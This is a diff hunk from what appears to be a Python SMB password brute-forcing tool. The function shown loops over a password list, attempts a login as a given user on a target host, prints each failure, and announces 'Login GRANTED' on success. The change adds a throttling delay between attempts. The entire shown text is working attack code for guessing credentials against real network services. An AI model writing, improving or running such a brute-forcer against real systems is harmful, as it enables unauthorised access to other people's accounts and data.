@@ -453,20 +453,21 @@ def smb_1_info():
 
 def smb_1_connect():
     password_list = smb_1_info()
-    connection = SMBConnection(remoteHost=info['host'], sess_port=info['port']) #Controllare connessione con try except
+    target_host = str(info['host']).strip()
+    target_port = int(info['port'])
+    connection = SMBConnection(remoteHost=target_host, remoteName=target_host, sess_port=target_port)
     for password in password_list:
         try:
             connection.login(user=info['user'], password=password)
-        except SessionError as e:
-            if e.getErrorCode() == ntstatus.STATUS_LOGON_FAILURE:
-                print(f'Login failed with user "{info['user']}" and password "{password}".')
-            else:
-                print(f'Various errors showed!')
-                sys.exit()
+            time.sleep(0.5)
+        except SessionError:
+            print(f'Login failed with user "{info['user']}" and password "{password}".')
         else:
             print(f'Login GRANTED with user "{info['user']}" and password "{password}".')
             break
     connection.close()
+
+
 
 
    
